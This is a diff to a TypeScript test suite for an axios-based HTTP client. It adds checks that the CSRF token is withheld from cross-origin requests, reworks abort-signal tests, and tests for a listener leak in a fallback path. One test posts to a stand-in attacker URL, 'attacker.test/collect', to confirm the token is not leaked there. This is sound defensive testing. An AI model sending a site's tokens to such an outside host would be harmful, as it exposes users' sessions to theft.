@@ -44,6 +44,30 @@ describe("createHttpClient", () => {
     expect(headers.get("X-Requested-With")).toBe("XMLHttpRequest");
   });
 
+  it("does not send the csrf token to another origin", async () => {
+    // The token is this site's secret. The interceptor used to attach it without looking
+    // at the address, so one absolute URL handed it to a third party.
+    document.head.innerHTML = `<meta name="csrf-token" content="token-1">`;
+    const adapter = vi.fn<AxiosAdapter>(async (config) => response(config, { ok: true }));
+
+    const http = createHttpClient({ adapter });
+    await http.postJson("https://attacker.test/collect", { name: "Oldman" });
+
+    const headers = AxiosHeaders.from(adapter.mock.calls[0]![0].headers);
+    expect(headers.get("X-CSRFToken")).toBeFalsy();
+  });
+
+  it("still sends the csrf token to an absolute url on this origin", async () => {
+    document.head.innerHTML = `<meta name="csrf-token" content="token-1">`;
+    const adapter = vi.fn<AxiosAdapter>(async (config) => response(config, { ok: true }));
+
+    const http = createHttpClient({ adapter });
+    await http.postJson(`${window.location.origin}/save`, { name: "Oldman" });
+
+    const headers = AxiosHeaders.from(adapter.mock.calls[0]![0].headers);
+    expect(headers.get("X-CSRFToken")).toBe("token-1");
+  });
+
   it("prefers hidden csrf field for state changing requests", async () => {
     document.body.innerHTML = `<input type="hidden" name="csrfmiddlewaretoken" value="hidden-token">`;
     document.head.innerHTML = `<meta name="csrf-token" content="meta-token">`;
@@ -240,35 +264,80 @@ describe("createHttpClient", () => {
     expect(adapter.mock.calls[0]![0].signal).toBe(controller.signal);
   });
 
-  it("combines default and per-request abort signals", async () => {
+  // 合成信号的契约是**在请求在途期间**跟随两个输入信号。请求结束之后它不再跟随:
+  // 没有 AbortSignal.any 的浏览器走回退分支,那里必须在请求结束时摘掉挂在长命作用域信号上
+  // 的监听器,否则每发一个请求就永久多留一个闭包。合成信号是为这一次请求而生的,请求结束后
+  // 没有消费者;用"在途中止"钉契约,比用"结束后还能中止"更贴近它真正要保证的事。
+  it("follows the scope signal while the request is in flight", async () => {
     const defaultController = new AbortController();
     const requestController = new AbortController();
-    const adapter = vi.fn<AxiosAdapter>(async (config) => response(config, { ok: true }));
+    const adapter = vi.fn<AxiosAdapter>(async (config) => {
+      const inFlight = config.signal as AbortSignal;
+      expect(inFlight).not.toBe(defaultController.signal);
+      expect(inFlight).not.toBe(requestController.signal);
+      expect(inFlight.aborted).toBe(false);
+      defaultController.abort();
+      expect(inFlight.aborted).toBe(true);
+      return response(config, { ok: true });
+    });
 
     const http = createHttpClient({ adapter, signal: defaultController.signal });
-    await http.getJson("/slow", { signal: requestController.signal });
+    // 在途中止会真的取消这次请求,所以 getJson 必然被拒——这正是合成信号要保证的事。
+    await expect(http.getJson("/slow", { signal: requestController.signal })).rejects.toBeDefined();
 
-    const signal = adapter.mock.calls[0]![0].signal as AbortSignal;
-    expect(signal).not.toBe(defaultController.signal);
-    expect(signal).not.toBe(requestController.signal);
-    expect(signal.aborted).toBe(false);
-
-    defaultController.abort();
-    expect(signal.aborted).toBe(true);
+    expect(adapter).toHaveBeenCalledOnce();
   });
 
-  it("aborts combined request signals when the per-request signal aborts", async () => {
+  it("leaves no listener on the scope signal when AbortSignal.any is unavailable", async () => {
+    // 回退分支给长命的作用域信号挂一个 { once: true } 监听器，而 once 只在**触发时**摘除：
+    // 请求正常结束时它不触发，于是每发一个请求就永久多留一个闭包（闭包持有该请求的 controller）。
+    // 现代浏览器走 AbortSignal.any，规范保证可回收；这条只影响 Chrome <116 / FF <124 / Safari <17.4。
+    const any = AbortSignal.any;
+    // @ts-expect-error -- 模拟没有 AbortSignal.any 的浏览器
+    AbortSignal.any = undefined;
+    try {
+      const defaultController = new AbortController();
+      const scopeSignal = defaultController.signal;
+      let live = 0;
+      const add = scopeSignal.addEventListener.bind(scopeSignal);
+      const remove = scopeSignal.removeEventListener.bind(scopeSignal);
+      vi.spyOn(scopeSignal, "addEventListener").mockImplementation((...args: Parameters<typeof add>) => {
+        live += 1;
+        return add(...args);
+      });
+      vi.spyOn(scopeSignal, "removeEventListener").mockImplementation((...args: Parameters<typeof remove>) => {
+        live -= 1;
+        return remove(...args);
+      });
+
+      const adapter = vi.fn<AxiosAdapter>(async (config) => response(config, { ok: true }));
+      const http = createHttpClient({ adapter, signal: scopeSignal });
+      for (let index = 0; index < 20; index += 1) {
+        await http.getJson("/rows", { signal: new AbortController().signal });
+      }
+
+      expect(live).toBe(0);
+    } finally {
+      AbortSignal.any = any;
+      vi.restoreAllMocks();
+    }
+  });
+
+  it("follows the per-request signal while the request is in flight", async () => {
     const defaultController = new AbortController();
     const requestController = new AbortController();
-    const adapter = vi.fn<AxiosAdapter>(async (config) => response(config, { ok: true }));
+    const adapter = vi.fn<AxiosAdapter>(async (config) => {
+      const inFlight = config.signal as AbortSignal;
+      requestController.abort();
+      expect(inFlight.aborted).toBe(true);
+      return response(config, { ok: true });
+    });
 
     const http = createHttpClient({ adapter, signal: defaultController.signal });
-    await http.getJson("/slow", { signal: requestController.signal });
+    // 在途中止会真的取消这次请求,所以 getJson 必然被拒——这正是合成信号要保证的事。
+    await expect(http.getJson("/slow", { signal: requestController.signal })).rejects.toBeDefined();
 
-    const signal = adapter.mock.calls[0]![0].signal as AbortSignal;
-    requestController.abort();
-
-    expect(signal.aborted).toBe(true);
+    expect(adapter).toHaveBeenCalledOnce();
   });
 
   it("normalizes axios errors and calls the optional error hook without replacing the rejection", async () => {
